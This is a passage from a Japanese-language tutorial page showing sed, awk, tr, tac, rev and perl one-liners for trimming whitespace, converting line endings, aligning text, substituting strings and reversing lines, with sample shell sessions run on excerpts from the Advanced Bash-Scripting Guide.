bash-3.2$ cat doc01.txt | awk '/Domain/ {total=total+NF};END{print total}'
11
bash-3.2$
</code></pre><h3 id=awk-特定の文字列を含む行数をカウント>awk 特定の文字列を含む行数をカウント</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doc03.txt data-lang=:doc03.txt>Advanced Bash-Scripting Guide
An in-depth exploration of the art of shell scripting
Mendel Cooper

&lt;thegrendel.abs@gmail.com&gt;

10
10 Mar 2014

Revision History
Revision 6.5    05 Apr 2012    Revised by: mc
&#39;TUNGSTENBERRY&#39; release
Revision 6.6    27 Nov 2012    Revised by: mc
&#39;YTTERBIUMBERRY&#39; release
Revision 10    10 Mar 2014    Revised by: mc
&#39;PUBLICDOMAIN&#39; release
This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX® wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts.

This book is suitable for classroom use as a general introduction to programming concepts.

This document is herewith granted to the Public Domain. No copyright!
</code></pre></div><pre tabindex=0><code>bash-3.2$
cat doc03.txt | awk '/examples/{n++}END{print n}'
1
bash-3.2$
</code></pre><h3 id=awk-最大文字列長を含む行を出力>awk 最大文字列長を含む行を出力</h3>
<p>(列 1 で最も長い文字列を見つけることを目的としています)。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doc03.txt data-lang=:doc03.txt>Advanced Bash-Scripting Guide
An in-depth exploration of the art of shell scripting
Mendel Cooper

&lt;thegrendel.abs@gmail.com&gt;

10
10 Mar 2014

Revision History
Revision 6.5    05 Apr 2012    Revised by: mc
&#39;TUNGSTENBERRY&#39; release
Revision 6.6    27 Nov 2012    Revised by: mc
&#39;YTTERBIUMBERRY&#39; release
Revision 10    10 Mar 2014    Revised by: mc
&#39;PUBLICDOMAIN&#39; release
This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX® wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts.

This book is suitable for classroom use as a general introduction to programming concepts.

This document is herewith granted to the Public Domain. No copyright!
</code></pre></div><pre tabindex=0><code>ash-3.2$ cat doc03.txt | awk '$1&gt;max{max=$1;maxline=$0}END{print max,maxline}'
This This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX(Q)* wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts.
bash-3.2$
</code></pre><h2 id=改行や空白の操作>改行や空白の操作</h2>
<h3 id=tr-改行をスペースに変換します>tr 改行をスペースに変換します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doc01.txt data-lang=:doc01.txt>This book is suitable for classroom use as a general introduction to programming concepts.  
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | tr -d '\n'
This book is suitable for classroom use as a general introduction to programming concepts.This document is herewith granted to the Public Domain. No copyright!bash-3.2$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>改行を切り落とす `tr -d &lsquo;\n&rsquo; は頻度の高いコマンドです。</dd>
<dd>注意する点は &lsquo;\n&rsquo; であって &ldquo;\n"ではありません。</dd>
<dd>対象は一文字なので、シングルクォートで囲む必要があります。</dd>
</dl>
</div>
<h3 id=tr-crlf-を-lf-形式に変換します>tr CRLF を LF 形式に変換します。</h3>
<p>行末にCRLF形式の改行「
」が入っているテキスト。<br>
「
」は、Ctrl＋VとCtrl＋Mで入力できます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:CRLF.txt data-lang=:CRLF.txt>This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat CRLF.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat CRLF.txt | tr -d '\r'
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>最近でもOSの違い、エディター間の解釈の違いから <code>
</code>が行末についてしまうこともまれにあります。手作業で除去することもできるのですが、該当箇所が多くある場合は、`tr -d &lsquo;\r&rsquo; で除去できることを覚えておくと良いです。</dd>
</dl>
</div>
<h3 id=sed-先頭の空白とタブを削除>sed 先頭の空白とタブを削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed -e <span class=s1>&#39;s/^[ \t]*//&#39;</span>
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>先頭のタブだけを削除したい場合は、`sed -e &rsquo;s/^[\t]*//' となります。</dd>
</dl>
</div>
<h3 id=awk-各行の終わりから末尾の空白-スペースタブ-を削除します>awk 各行の終わりから末尾の空白 (スペース、タブ) を削除します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-ENDTAB.txt data-lang=ENDTAB.txt>This book is suitable for classroom use as a general introduction to programming concepts.[TAB]
This document is herewith granted to the Public Domain. No copyright![TAB] 
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat ENDTAB.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat ENDTAB.txt | awk '{sub(/[ \t]+$/,&quot;&quot;)};1'
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
</code></pre><h3 id=sed-各行から先頭と末尾の両方の空白を削除します>sed 各行から先頭と末尾の両方の空白を削除します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:space.txt data-lang=:space.txt>   This book is suitable for classroom use as a general introduction to programming concepts.   
   This document is herewith granted to the Public Domain. No copyright!   
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat space.txt
   This book is suitable for classroom use as a general introduction to programming concepts.
   This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat space.txt | sed 's/^[ \t]*//;s/[ \t]*$//'
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
</code></pre><h3 id=awk-各行から先頭と末尾の両方の空白を削除します>awk 各行から先頭と末尾の両方の空白を削除します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:space.txt data-lang=:space.txt>   This book is suitable for classroom use as a general introduction to programming concepts.   
   This document is herewith granted to the Public Domain. No copyright!   
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat space.txt
   This book is suitable for classroom use as a general introduction to programming concepts.
   This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat space.txt | awk '{gsub(/^[ \t]+|[ \t]+$/,&quot;&quot;)};1'
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
</code></pre><h3 id=awk-各行から先頭と末尾の両方の空白を削除します-1>awk 各行から先頭と末尾の両方の空白を削除します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:space.txt data-lang=:space.txt>   This book is suitable for classroom use as a general introduction to programming concepts.   
   This document is herewith granted to the Public Domain. No copyright!   
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat space.txt
   This book is suitable for classroom use as a general introduction to programming concepts.
   This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat space.txt | awk '{$1=$1};1'
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
</code></pre><h3 id=sed-各行の終わりから末尾の空白-スペースタブ-を削除します>sed 各行の終わりから末尾の空白 (スペース、タブ) を削除します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-ENDTAB.txt data-lang=ENDTAB.txt>This book is suitable for classroom use as a general introduction to programming concepts.[TAB]
This document is herewith granted to the Public Domain. No copyright![TAB] 
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat ENDTAB.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat ENDTAB.txt | sed 's/[ \t]*$//'
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
</code></pre><h3 id=sed-各行の先頭に-5-つの空白を挿入します-ページ-オフセットを作成します>sed 各行の先頭に 5 つの空白を挿入します (ページ オフセットを作成します)。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doc01.txt data-lang=:doc01.txt>This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | sed -e 's/^/     /g'
     This book is suitable for classroom use as a general introduction to programming concepts.
     This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
</code></pre><h3 id=awk-各行の先頭に-5-つの空白を挿入します-ページ-オフセットを作成します>awk 各行の先頭に 5 つの空白を挿入します (ページ オフセットを作成します)。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doc01.txt data-lang=:doc01.txt>This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | awk '{sub(/^/,&quot;     &quot;)};1'
     This book is suitable for classroom use as a general introduction to programming concepts.
     This document is herewith granted to the Public Domain. No copyright!
bash-3.2$

</code></pre><h3 id=sed-２行間の改行を削除>sed ２行間の改行を削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:newline.txt data-lang=:newline.txt>currentLine
nextLine
</code></pre></div><pre tabindex=0><code>$ cat newline.xt | sed ':a;N;$!ba;s/\n//g'
$ currentLinenextLine
$ 
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>もちろん <code>tr -d '\n'</code> でも同様のことができます。</dd>
</dl>
</div>
<h2 id=水平位置の揃え方>水平位置の揃え方</h2>
<h3 id=sed-各行の先頭から先頭の空白-スペースタブ-を削除しすべてのテキストを揃えて左揃えにします>sed 各行の先頭から先頭の空白 (スペース、タブ) を削除し、すべてのテキストを揃えて左揃えにします。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:TAB.txt data-lang=:TAB.txt>  This book is suitable for classroom use as a general introduction to programming concepts.
  This document is herewith granted to the Public Domain. No copyright!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat TAB.txt
  This book is suitable for classroom use as a general introduction to programming concepts.
  This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat TAB.txt | sed 's/^[ \t]*//'
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
</code></pre><h3 id=awk-各行の先頭から先頭の空白-スペースタブ-を削除しすべてのテキストを揃えて左揃えにします>awk 各行の先頭から先頭の空白 (スペース、タブ) を削除し、すべてのテキストを揃えて左揃えにします。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:TAB.txt data-lang=:TAB.txt>  This book is suitable for classroom use as a general introduction to programming concepts.
  This document is herewith granted to the Public Domain. No copyright!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat TAB.txt
  This book is suitable for classroom use as a general introduction to programming concepts.
  This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat TAB.txt | awk'{sub(/^[ \t]+/,&quot;&quot;)};1'
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
</code></pre><h3 id=sed-テキストを列幅79で右揃えにします>sed テキストを列幅79で右揃えにします。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doc01.txt data-lang=:doc01.txt>This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | sed -e :a -e 's/^.\{1,78\}$/ &amp;/;ta'
This book is suitable for classroom use as a general introduction to programming concepts.
          This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
</code></pre><h3 id=awk-テキストを列幅79で右揃えにします>awk テキストを列幅79で右揃えにします。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doc01.txt data-lang=:doc01.txt>This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | awk '{printf &quot;%79s\n&quot;,$0}'
This book is suitable for classroom use as a general introduction to programming concepts.
          This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
</code></pre><h3 id=sed-テキストを列幅79で中央揃えにします>sed テキストを列幅79で中央揃えにします。</h3>
<p>すべてのテキストを 79 列幅の中央に配置します。<br>
sed 方法１では、行頭のスペースが重要であり、後続のスペースは行末に追加されます。<br>
sed 方法２では、行の先頭にあるスペースは行の中央揃えで破棄され、行末に末尾のスペースは表示されません。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doc01.txt data-lang=:doc01.txt>This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
</code></pre></div><p>sed 方法１</p>
<pre tabindex=0><code>bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | sed -e :a -e 's/^.\{1,77\}$/ &amp;/;ta'
This book is suitable for classroom use as a general introduction to programming concepts.
         This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
</code></pre><p>sed 方法２</p>
<pre tabindex=0><code>bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | sed -e :a -e 's/^.\{1,77\}$/ &amp;/;ta' -e 's/\( *\)\1/\1/'
This book is suitable for classroom use as a general introduction to programming concepts.
     This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
</code></pre><h3 id=awk-テキストを列幅79で中央揃えにします>awk テキストを列幅79で中央揃えにします。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doc01.txt data-lang=:doc01.txt>This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | awk '{l=length();s=int((79-l)/2);printf &quot;%&quot;(s+l)&quot;s\n&quot;,$0}'
This book is suitable for classroom use as a general introduction to programming concepts.
     This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
</code></pre><h2 id=検索と置換>検索と置換</h2>
<h3 id=sed-bazを含む行のfooをbarに置き換えます>sed bazを含む行のfooをbarに置き換えます。</h3>
<pre tabindex=0><code>sed '/baz/s/foo/bar/g'
</code></pre><p>このコマンドはわかりやすく分解すると、</p>
<pre tabindex=0><code>sed '/baz/' 
</code></pre><p>で、まずは baz を含む行を抽出します。<br>
その上で、</p>
<pre tabindex=0><code>sed 's/foo/bar/g'
</code></pre><p>で、文字列 foo を bar に変換します。<br>
この２つの<code>sed</code>コマンドをつなげると</p>
<pre tabindex=0><code>sed '/baz/s/foo/bar/g'
</code></pre><p>となるわけです。</p>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>この組み合わせコマンドは<code>sed</code>の高速化に貢献します。</dd>
</dl>
</div>
<h3 id=awk-bazを含む行のfooをbarに置き換えます>awk bazを含む行のfooをbarに置き換えます。</h3>
<pre tabindex=0><code>awk '/baz/{gsub(/foo/, &quot;bar&quot;)}; 1'
</code></pre><h3 id=sed-bazを除く行のfooをbarに置き換えます>sed bazを除く行のfooをbarに置き換えます。</h3>
<pre tabindex=0><code>sed '/baz/!s/foo/bar/g'
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>`sed &lsquo;/baz/!&rsquo; が baz「以外」のという意味になります。</dd>
</dl>
</div>
<h3 id=awk-bazを除く行のfooをbarに置き換えます>awk bazを除く行のfooをbarに置き換えます。</h3>
<pre tabindex=0><code>awk '!/baz/{gsub(/foo/, &quot;bar&quot;)}; 1'
</code></pre><h3 id=sed-scarletまたはrubyまたはpuceをredに変更します>sed scarletまたはrubyまたはpuceをredに変更します。</h3>
<pre tabindex=0><code>sed 's/scarlet/red/g;s/ruby/red/g;s/puce/red/g'
</code></pre><p>こちらは３つの<code>sed</code>コマンドが一つになった書き方です。<br>
多くの場合はこう書くことが多いです。</p>
<pre tabindex=0><code>sed -e 's/scarlet/red/g' -e 's/ruby/red/g' -e 's/puce/red/g'
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>セミコロン <code>;</code> で区切ることで一行で書くこともできるということです。</dd>
</dl>
</div>
<h3 id=gsed-scarletまたはrubyまたはpuceをredに変更します>gsed scarletまたはrubyまたはpuceをredに変更します。</h3>
<pre tabindex=0><code>gsed 's/scarlet\|ruby\|puce/red/g'
</code></pre><p>多くの場合はこう書くことでしょう。</p>
<pre tabindex=0><code>sed -e 's/scarlet/red/g' 
    -e 's/ruby/red/g' 
    -e 's/puce/red/g'
</code></pre><p>一つ前の項目で、上記をさらに簡潔に書くことを紹介しました。<br>
<code>;</code>セミコロンで区切るのでしたね。</p>
<pre tabindex=0><code>sed 's/scarlet/red/g;s/ruby/red/g;s/puce/red/g'
</code></pre><p>もっとわかりやすく書くこともできるわけです。<br>
<code>\</code> エスケープした上で <code>|</code>パイプで区切り、条件を複数列挙します。</p>
<pre tabindex=0><code>gsed 's/scarlet\|ruby\|puce/red/g'
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>sed -e</code> は 複数の <code>sed</code> を連続させるときに使うオプションですが、<code>;</code>セミコロンで区切り連続させることもできますし、<code>\|</code>パイプで条件を区切り列挙することもできます。</dd>
<dd>見やすいと思う方法でプログラムを書けば良いと思います。</dd>
</dl>
</div>
<h3 id=awk-scarletまたはrubyまたはpuceをredに変更します>awk scarletまたはrubyまたはpuceをredに変更します。</h3>
<pre tabindex=0><code>awk '{gsub(/scarlet|ruby|puce/, &quot;red&quot;)}; 1'
</code></pre><h3 id=sed-文中の最初のfooだけをbarに置換>sed 文中の最初のfooだけをbarに置換</h3>
<pre tabindex=0><code>sed 's/foo/bar/'                      
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>「最初に見つかった」語句だけではなく、複数箇所の語句を置換したい場合は、グローバルオプション<code>g</code>をつけます。</dd>
<dd>sed &rsquo;s/foo/bar/g' となります。</dd>
</dl>
</div>
<h3 id=awk-文中の最初のfooだけをbarに置換>awk 文中の最初のfooだけをbarに置換</h3>
<pre tabindex=0><code>awk '{sub(/foo/,&quot;bar&quot;)}; 1'           
</code></pre><h3 id=sed-文中の４つ目のfooだけをbarに置換>sed 文中の４つ目のfooだけをbarに置換</h3>
<pre tabindex=0><code>sed 's/foo/bar/4'                     
</code></pre><h3 id=awk-文中の４つ目のfooだけをbarに置換>awk 文中の４つ目のfooだけをbarに置換</h3>
<pre tabindex=0><code>gawk '{$0=gensub(/foo/,&quot;bar&quot;,4)}; 1'  
</code></pre><h3 id=sed-文中のすべてのfooをbarに置換>sed 文中のすべてのfooをbarに置換</h3>
<pre tabindex=0><code>sed 's/foo/bar/g'                     
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>「最初に見つかった」語句だけを置換したい場合は、グローバルオプション<code>g</code>をはずします。</dd>
<dd>sed &rsquo;s/foo/bar/' となります。</dd>
</dl>
</div>
<h3 id=awk-文中のすべてのfooをbarに置換>awk 文中のすべてのfooをbarに置換</h3>
<pre tabindex=0><code>awk '{gsub(/foo/,&quot;bar&quot;)}; 1'          
</code></pre><h3 id=sed-文中にある複数のfooの最後から二つ目のみをbarに置換>sed 文中にある複数のfooの最後から二つ目のみをbarに置換</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:foobar.txt data-lang=:foobar.txt>foo foo foo foo foo
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat foobar.txt
foo foo foo foo foo
bash-3.2$ cat foobar.txt | sed 's/\(.*\)foo\(.*foo\)/\1bar\2/'
foo foo foo bar foo
bash-3.2$
</code></pre><h3 id=sed-文中にある複数のfooの最後のfooだけをbarに置換>sed 文中にある複数のfooの最後のfooだけをbarに置換</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:foobar.txt data-lang=:foobar.txt>foo foo foo foo foo
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat foobar.txt
foo foo foo foo foo
bash-3.2$ cat foobar.txt | sed 's/\(.*\)foo/\1bar/'
foo foo foo foo bar
bash-3.2$
</code></pre><h2 id=行や段落の操作>行や段落の操作</h2>
<h3 id=tac-行の逆順catの逆>tac 行の逆順（catの逆）</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doc01.txt data-lang=:doc01.txt>This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | tac
This document is herewith granted to the Public Domain. No copyright!
This book is suitable for classroom use as a general introduction to programming concepts.
bash-3.2$
</code></pre><h3 id=sed-行の逆順catの逆>sed 行の逆順（catの逆）</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doc01.txt data-lang=:doc01.txt>This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | sed '1!G;h;$!d'
This document is herewith granted to the Public Domain. No copyright!
This book is suitable for classroom use as a general introduction to programming concepts.
bash-3.2$
</code></pre><h3 id=sed-行の逆順catの逆-1>sed 行の逆順（catの逆）</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doc01.txt data-lang=:doc01.txt>This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | sed -n '1!G;h;$p'
This document is herewith granted to the Public Domain. No copyright!
This book is suitable for classroom use as a general introduction to programming concepts.
bash-3.2$
</code></pre><h3 id=awk-行の逆順catの逆>awk 行の逆順（catの逆）</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doc01.txt data-lang=:doc01.txt>This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt |awk '{a[i++]=$0} END {for (j=i-1; j&gt;=0;) print a[j--] }'
This document is herewith granted to the Public Domain. No copyright!
This book is suitable for classroom use as a general introduction to programming concepts.
bash-3.2$
</code></pre><h3 id=perl-行の逆順catの逆>perl 行の逆順（catの逆）</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doc01.txt data-lang=:doc01.txt>This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | perl -e 'print reverse &lt;&gt;'
This document is herewith granted to the Public Domain. No copyright!
This book is suitable for classroom use as a general introduction to programming concepts.
bash-3.2$
</code></pre><h3 id=rev-行の各文字を反転します>rev 行の各文字を反転します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:hello.txt data-lang=:hello.txt>Hello, world.
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat hello.txt
Hello, world.
bash-3.2$ cat hello.txt | rev
.dlrow ,olleH
bash-3.2$
</code></pre><h3 id=sed-行の各文字を反転します>sed 行の各文字を反転します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:hello.txt data-lang=:hello.txt>Hello, world.
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat hello.txt
Hello, world.
bash-3.2$ cat hello.txt | sed '/\n/!G;s/\(.\)\(.*\n\)/&amp;\2\1/;//D;s/.//'
.dlrow ,olleH
bash-3.2$
</code></pre><h3 id=perl-行の各文字を反転します>perl 行の各文字を反転します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:hello.txt data-lang=:hello.txt>Hello, world.
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat hello.txt
Hello, world.
bash-3.2$ cat hello.txt | sed '/\n/!G;s/\(.\)\(.*\n\)/&amp;\2\1/;//D;s/.//'
.dlrow ,olleH
bash-3.2$ cat hello.txt | perl -nle 'print scalar reverse $_'
.dlrow ,olleH
bash-3.2$
</code></pre><h3 id=sed-行を水平方向に結合>sed 行を水平方向に結合</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:hello03.txt data-lang=:hello03.txt>Hello, world.
Welcome to Japan.
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat hello03.txt
Hello, world.
Welcome to Japan.
bash-3.2$ cat hello03.txt | sed '$!N;s/\n/ /'
Hello, world. Welcome to Japan.
bash-3.2$
</code></pre><h3 id=gsed-5行ごとに空白行を追加5101520-行などの後>gsed 5行ごとに空白行を追加(5、10、15、20 行などの後)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doc04.txt data-lang=:doc04.txt>Advanced Bash-Scripting Guide
An in-depth exploration of the art of shell scripting
Mendel Cooper
&lt;thegrendel.abs@gmail.com&gt;
10
10 Mar 2014
Revision History
Revision 6.5    05 Apr 2012    Revised by: mc
&#39;TUNGSTENBERRY&#39; release
Revision 6.6    27 Nov 2012    Revised by: mc
&#39;YTTERBIUMBERRY&#39; release
Revision 10    10 Mar 2014    Revised by: mc
&#39;PUBLICDOMAIN&#39; release
This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX(Q)* wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts.
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat doc04.txt | gsed '0~5G'
Advanced Bash-Scripting Guide
An in-depth exploration of the art of shell scripting
Mendel Cooper
&lt;thegrendel.abs@gmail.com&gt;
10

10 Mar 2014
Revision History
Revision 6.5    05 Apr 2012    Revised by: mc
'TUNGSTENBERRY' release
Revision 6.6    27 Nov 2012    Revised by: mc

'YTTERBIUMBERRY' release
Revision 10    10 Mar 2014    Revised by: mc
'PUBLICDOMAIN' release
This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX(Q)* wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts.
This book is suitable for classroom use as a general introduction to programming concepts.

This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
</code></pre><h3 id=sed-5行ごとに空白行を追加5101520-行などの後>sed 5行ごとに空白行を追加(5、10、15、20 行などの後)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doc04.txt data-lang=:doc04.txt>Advanced Bash-Scripting Guide
An in-depth exploration of the art of shell scripting
Mendel Cooper
&lt;thegrendel.abs@gmail.com&gt;
10
10 Mar 2014
Revision History
Revision 6.5    05 Apr 2012    Revised by: mc
&#39;TUNGSTENBERRY&#39; release
Revision 6.6    27 Nov 2012    Revised by: mc
&#39;YTTERBIUMBERRY&#39; release
Revision 10    10 Mar 2014    Revised by: mc
&#39;PUBLICDOMAIN&#39; release
This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX(Q)* wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts.
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
